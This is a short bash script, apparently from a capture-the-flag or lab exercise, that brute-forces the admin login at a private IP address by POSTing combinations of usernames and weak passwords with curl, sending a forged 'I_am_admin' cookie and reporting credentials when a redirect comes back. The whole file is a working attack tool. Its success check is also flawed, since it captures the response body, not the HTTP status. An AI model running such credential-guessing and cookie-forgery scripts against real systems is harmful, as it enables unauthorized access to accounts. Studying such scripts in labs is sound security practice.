#!/bin/bash

cookie="I_am_admin=b326b5062b2f0e69046810717534cb09"
url="http://10.13.0.160/admin/"
userlist=("admin" "root")
passlist=("admin" "root" "dragon")
for user in ${userlist[@]}; do
	for pass in ${passlist[@]}; do
		http_code=$(curl --cookie "I_am_admin=b326b5062b2f0e69046810717534cb09" -d "username=${user}&password=${pass}" -X POST ${url})
		echo ${http_code}
		if [[ ${http_code} -eq 302 ]]; then
			echo "Success: User: '${user}' Pass: '${pass}'"
			break 2
		fi
	done
done
